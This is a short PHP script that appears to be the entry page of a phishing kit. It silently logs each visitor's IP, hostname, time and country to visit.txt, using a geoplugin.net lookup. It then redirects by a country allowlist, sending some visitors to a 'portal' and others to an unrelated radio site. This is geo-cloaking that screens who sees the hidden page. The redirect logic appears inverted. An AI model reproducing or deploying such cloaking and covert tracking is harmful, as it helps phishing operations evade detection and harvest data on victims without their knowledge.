<?php
error_reporting(0);

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
date_default_timezone_set('GMT');
$time = date("d-m-Y H:i:s");
$userAgent = getenv("HTTP_USER_AGENT");



$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$country = $J7->geoplugin_countryName;
$EKO = $J7->geoplugin_countryCode;
$file = fopen("visit.txt", "a");
fwrite($file, $ip . "         [TIM]" . $time . "        [CNT]" . $country . "            [HOST]" . $hostname . "\n"); 







//$EKO = $_SESSION['green']; 
//$uO = "Subscribe/"; 
//Subscribe here <a href='$uO'>Click here</a>

include 'database.php';
//if users IP is not in allowed list kill the script
if(!in_array($EKO,$allowlist)){
    die(" <meta http-equiv='refresh' content='0; url=portal'>" );
}


    die(" <meta http-equiv='refresh' content='0; url=http://playfmradio.com/'>" );



exit;

